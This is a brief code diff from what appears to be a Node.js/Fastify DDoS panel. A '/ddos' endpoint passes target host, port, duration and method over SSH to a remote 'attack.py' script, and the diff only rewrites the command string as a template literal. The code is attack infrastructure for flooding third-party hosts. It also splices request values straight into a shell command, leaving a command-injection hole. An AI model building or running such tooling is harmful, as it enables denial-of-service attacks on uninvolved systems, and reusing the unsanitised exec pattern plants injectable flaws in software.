@@ -44,7 +44,7 @@ fastify.post('/ddos', function (req, res) {
 async function attack(host, port, time, method){
     let conn = new Client();
     conn.on('ready', function() {
-        conn.exec('python3 /home/attack.py ' + host + ' ' + port + ' ' + time + ' ' + method, function(err, stream) {
+        conn.exec(`python3 /home/attack.py ${host} ${port} ${time} ${method}`, function(err, stream) {
             if (err) throw err;
             stream.on('close', function(code, signal) {
                 console.log('Stream :: close :: code: ' + code + ', signal: ' + signal);
